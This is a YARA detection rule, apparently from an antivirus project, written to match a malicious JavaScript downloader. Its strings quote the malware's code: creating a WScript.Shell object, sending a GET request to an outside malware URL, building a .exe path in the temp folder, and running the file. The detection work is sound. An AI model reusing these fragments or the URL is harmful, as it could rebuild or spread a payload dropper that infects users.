rule sig_20160330_1c3ae9645b063d44dd2896b3ac1bc0a1 {
  meta:
    description = "datamaliciousorder - file 20160330_1c3ae9645b063d44dd2896b3ac1bc0a1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "80fe243667b520772452f39937ac0944f67c1dd3a3aa7f33c49dd7d7f57d6f71"

  strings:
    $s1  = "var XK = function P() {return WScript[E](\"WScript\"+\".Shell\");}(), NR = 11;" fullword ascii
    $s2  = "IK[R](\"GET\", \"http://bigmishki.ru/l3osjf\", false);" fullword ascii
    $s3  = "function O(IC, P0){NA = NA * 1; return IC - P0;};" fullword ascii
    $s4  = "if (IK[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SP() {return XK[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8oOk20PWOxxwK0.ex\" + \"e\";};" fullword ascii
    $s6  = "function B(){return G + \"\";};" fullword ascii
    $s7  = "function CE(Y){XK[\"Run\"](Y, NA, NA);};" fullword ascii
    $s8  = "function AA() {return ((KC == true) && (KC == N)) ? 1 : NA;};" fullword ascii
    $s9  = "function U(){return 22;};" fullword ascii
    $s10 = "function IQ()" fullword ascii
    $s11 = "return O(VI, BS);" fullword ascii
    $s12 = "function W(Q) {var HU = (1, 2, 3, 4, 5, Q); return HU;};" fullword ascii
    $s13 = "function L(){return E;};" fullword ascii
    $s14 = "var Q2 = new this[\"Date\"]();" fullword ascii
    $s15 = "}while (Q0);" fullword ascii
    $s16 = "N = true; " fullword ascii
    $s17 = "KC = true; " fullword ascii
    $s18 = "var KC = false;" fullword ascii
    $s19 = "var IA = false;" fullword ascii
    $s20 = "} catch(L1){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}